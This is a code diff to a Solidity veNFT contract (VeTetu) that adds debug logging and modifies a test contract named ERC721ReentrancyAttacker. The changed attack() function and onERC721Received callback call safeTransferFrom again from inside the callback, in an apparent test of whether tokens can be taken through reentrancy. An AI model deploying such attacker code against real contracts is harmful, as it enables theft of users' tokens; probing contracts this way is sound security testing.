@@ -338,10 +338,16 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
   /// @return bool whether the msg.sender is approved for the given token ID,
   ///              is an operator of the owner, or is the owner of the token
   function isApprovedOrOwner(address _spender, uint _tokenId) public view override returns (bool) {
+    console.log("isApprovedOrOwner _spender _tokenId", _spender, tokenId);
     address owner = _idToOwner[_tokenId];
+    console.log("owner", owner);
     bool spenderIsOwner = owner == _spender;
     bool spenderIsApproved = _spender == _idToApprovals[_tokenId];
     bool spenderIsApprovedForAll = (ownerToOperators[owner])[_spender];
+    console.log("_idToApprovals", _idToApprovals[_tokenId]);
+    console.log("spenderIsOwner", spenderIsOwner);
+    console.log("spenderIsApproved", spenderIsApproved);
+    console.log("spenderIsApprovedForAll", spenderIsApprovedForAll);
     return spenderIsOwner || spenderIsApproved || spenderIsApprovedForAll;
   }
 
@@ -515,6 +521,11 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
     uint _tokenId,
     address _sender
   ) internal {
+    console.log("_transferFrom._from", _from);
+    console.log("_transferFrom._to", _to);
+    console.log("_transferFrom._tokenId", _tokenId);
+    console.log("_transferFrom._sender", _sender);
+
     require(isApprovedOrOwner(_sender, _tokenId), "NOT_OWNER");
     require(_to != address(0), "WRONG_INPUT");
     // from address will be checked in _removeTokenFrom()
@@ -1342,9 +1353,9 @@ contract ERC721ReentrancyAttacker {
   }
 
   // Reentrancy attack
-  function attack(address from) public payable {
+  function attack(uint tokensTo_, address from) public payable {
     console.log("Attack from", from);
-    tokensTo--;
+    tokensTo = tokensTo_;
     //vulnerable.safeTransferFrom();
     console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo);
     vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
@@ -1355,8 +1366,10 @@ contract ERC721ReentrancyAttacker {
     console.log("onERC721Received");
     if (tokensTo > 0) {
       tokensTo--;
+      address tokenOwner = vulnerable.ownerOf(tokensTo);
+      console.log("tokenOwner of tokensTo", tokenOwner, tokensTo);
       //vulnerable.safeTransferFrom();
-      console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo);
+      console.log("safeTransferFrom from to tokensTo", tokenOwner, address(this) ,tokensTo);
       vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
     }
     return this.onERC721Received.selector;
